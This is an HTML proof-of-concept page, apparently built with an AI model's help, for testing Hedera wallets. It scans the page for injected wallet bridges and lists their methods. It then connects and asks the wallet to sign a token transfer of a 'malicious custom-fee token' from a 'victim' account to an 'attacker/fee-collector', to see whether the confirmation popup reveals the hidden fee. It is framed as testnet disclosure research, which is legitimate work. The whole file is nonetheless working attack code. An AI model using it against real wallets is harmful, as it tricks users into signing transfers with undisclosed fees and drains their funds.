<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Wallet Bridge Fee Disclosure PoC</title>
<script src="./hedera-sdk.bundle.js"></script>
<style>
  body { font-family: -apple-system, sans-serif; background: #0d0d0d; color: #e6e6e6; padding: 16px; margin: 0; }
  h1 { font-size: 18px; margin-bottom: 4px; }
  .sub { color: #999; font-size: 12px; margin-bottom: 16px; }
  label { display: block; font-size: 12px; color: #aaa; margin-top: 10px; }
  input { width: 100%; box-sizing: border-box; padding: 8px; border-radius: 6px; border: 1px solid #333; background: #1a1a1a; color: #fff; font-size: 14px; margin-top: 4px; }
  button { width: 100%; padding: 12px; margin-top: 12px; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; }
  #discoverBtn { background: #2b6cb0; color: #fff; }
  #connectBtn { background: #38a169; color: #fff; }
  #sendBtn { background: #c53030; color: #fff; }
  #log { margin-top: 16px; background: #111; border: 1px solid #222; border-radius: 8px; padding: 10px; height: 300px; overflow-y: auto; font-family: monospace; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
  .ok { color: #68d391; }
  .err { color: #fc8181; }
  .info { color: #63b3ed; }
</style>
</head>
<body>

<h1>Wallet Bridge Fee Disclosure PoC</h1>
<div class="sub">Testnet only. Discovers the injected wallet bridge, then attempts to trigger a token send carrying a hidden custom fee, to check whether the confirmation UI discloses it.</div>

<button id="discoverBtn">1. Discover Injected Bridge</button>
<button id="connectBtn">2. Connect Wallet</button>

<label>Token ID (the malicious custom-fee token, e.g. 0.0.10037892)</label>
<input id="tokenId" placeholder="0.0.xxxxxxx" />

<label>Sender Account ID (your connected/victim test account)</label>
<input id="senderId" placeholder="0.0.xxxxxxx" />

<label>Recipient Account ID (attacker/fee-collector or any test account)</label>
<input id="recipientId" placeholder="0.0.xxxxxxx" />

<label>Amount (smallest unit, e.g. 1000 = 1000 tinytoken units)</label>
<input id="amount" value="1000" />

<button id="sendBtn">3. Trigger Send (watch the popup)</button>

<div id="log">Waiting...\n</div>

<script type="module">
  const logEl = document.getElementById("log");
  function log(msg, cls = "") {
    const line = document.createElement("div");
    if (cls) line.className = cls;
    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    logEl.appendChild(line);
    logEl.scrollTop = logEl.scrollHeight;
  }

  // Common names wallets inject under. Add more here as you discover them.
  const CANDIDATE_GLOBALS = [
    "hashpack",
    "saucerswapWallet",
    "hashconnect",
    "hederaWallet",
    "ethereum", // in case EVM-style provider is also exposed
  ];

  let activeBridgeName = null;

  function inspectObject(obj, name, depth = 0) {
    if (!obj || depth > 1) return;
    const keys = Object.keys(obj).concat(
      Object.getOwnPropertyNames(Object.getPrototypeOf(obj) || {})
    );
    const uniqueKeys = [...new Set(keys)].filter(
      (k) => !["constructor"].includes(k)
    );
    uniqueKeys.forEach((k) => {
      let type;
      try {
        type = typeof obj[k];
      } catch (e) {
        type = "unreadable";
      }
      log(`  window.${name}.${k} -> ${type}`, "info");
    });
  }

  document.getElementById("discoverBtn").addEventListener("click", () => {
    log("Scanning window for injected wallet bridges...");
    let found = 0;
    CANDIDATE_GLOBALS.forEach((name) => {
      if (window[name]) {
        found++;
        activeBridgeName = activeBridgeName || name;
        log(`FOUND: window.${name}`, "ok");
        inspectObject(window[name], name);
      }
    });
    if (found === 0) {
      log("No known bridge object found under common names. Open this page's URL bar / check console manually, or add candidate names to CANDIDATE_GLOBALS.", "err");
    } else {
      log(`Using "${activeBridgeName}" as active bridge for connect/send.`, "info");
    }
  });

  document.getElementById("connectBtn").addEventListener("click", async () => {
    if (!activeBridgeName) {
      log("Run Discover first.", "err");
      return;
    }
    const bridge = window[activeBridgeName];
    const attempts = ["connect", "requestAccounts", "enable", "pair"];
    for (const fn of attempts) {
      if (typeof bridge[fn] === "function") {
        try {
          log(`Trying ${activeBridgeName}.${fn}()...`);
          const result = await bridge[fn]();
          log(`SUCCESS ${fn}(): ${JSON.stringify(result)}`, "ok");
          return;
        } catch (e) {
          log(`${fn}() failed: ${e.message}`, "err");
        }
      }
    }
    log("No working connect method found among: " + attempts.join(", "), "err");
  });

  document.getElementById("sendBtn").addEventListener("click", async () => {
    if (!activeBridgeName) {
      log("Run Discover first.", "err");
      return;
    }
    const bridge = window[activeBridgeName];
    const tokenId = document.getElementById("tokenId").value.trim();
    const senderId = document.getElementById("senderId").value.trim();
    const recipientId = document.getElementById("recipientId").value.trim();
    const amount = parseInt(document.getElementById("amount").value.trim(), 10);

    if (!tokenId || !senderId || !recipientId || !amount) {
      log("Fill in all fields first.", "err");
      return;
    }

    log("Building TransferTransaction bytes via bundled @hashgraph/sdk...");
    try {
      if (!window.HederaSDK) {
        log("HederaSDK bundle not loaded — check that hedera-sdk.bundle.js is hosted next to this HTML file.", "err");
        return;
      }
      const { TransferTransaction, AccountId, TokenId } = window.HederaSDK;
      const tx = new TransferTransaction()
        .addTokenTransfer(TokenId.fromString(tokenId), AccountId.fromString(senderId), -amount)
        .addTokenTransfer(TokenId.fromString(tokenId), AccountId.fromString(recipientId), amount)
        .setTransactionId(undefined) // let wallet fill in
        .setMaxTransactionFee(100000000); // 1 HBAR max, adjust as needed

      const bytes = tx.toBytes ? tx.toBytes() : null;
      log(`Transaction built. Byte length: ${bytes ? bytes.length : "n/a"}`, "info");

      const attempts = ["signTransaction", "sendTransaction", "signAndSendTransaction", "executeTransaction"];
      let triggered = false;
      for (const fn of attempts) {
        if (typeof bridge[fn] === "function") {
          triggered = true;
          try {
            log(`Calling ${activeBridgeName}.${fn}(bytes)... watch your wallet app now for the confirmation popup.`);
            const result = await bridge[fn](bytes);
            log(`Response from ${fn}(): ${JSON.stringify(result)}`, "ok");
          } catch (e) {
            log(`${fn}() error/rejected: ${e.message}`, "err");
          }
          break; // stop after first method that exists; remove this break to try all
        }
      }
      if (!triggered) {
        log("No known send/sign method found among: " + attempts.join(", ") + ". Check Discover output above for the real method name and tell Claude what you see.", "err");
      }
    } catch (e) {
      log(`Failed to build/send transaction: ${e.message}`, "err");
    }
  });

  log("Page ready. Tap 'Discover Injected Bridge' first.");
</script>

</body>
</html>
